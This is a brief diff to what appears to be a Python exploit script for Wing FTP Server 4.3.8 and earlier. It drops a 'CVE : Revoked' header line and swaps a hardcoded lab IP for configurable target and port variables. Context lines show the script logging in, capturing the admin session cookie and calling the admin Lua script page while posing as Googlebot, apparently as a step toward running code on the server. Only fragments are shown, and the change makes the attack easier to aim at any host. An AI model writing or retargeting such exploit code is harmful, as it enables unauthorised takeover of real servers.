@@ -6,7 +6,6 @@
 # Software Link: https://www.wftpserver.com/download/WingFtpServer.exe
 # Version: <=4.3.8
 # Tested on: Windows
-# CVE : Revoked
 
 # !/usr/bin/python3
 import requests
@@ -55,7 +54,7 @@ else:
     r = requests.post(url, headers=headers, data=data)
     cookie = 'UIDADMIN=' + r.cookies['UIDADMIN']
     print('Login successful - Cookie: ' + cookie)
-    url = "http://172.31.1.20:8080/admin_lua_script.html"
+    url = "http://" + target + ":" + targetport + "/admin_lua_script.html"
     headers = {
         "User-Agent": "Googlebot",
         "Cookie": cookie,
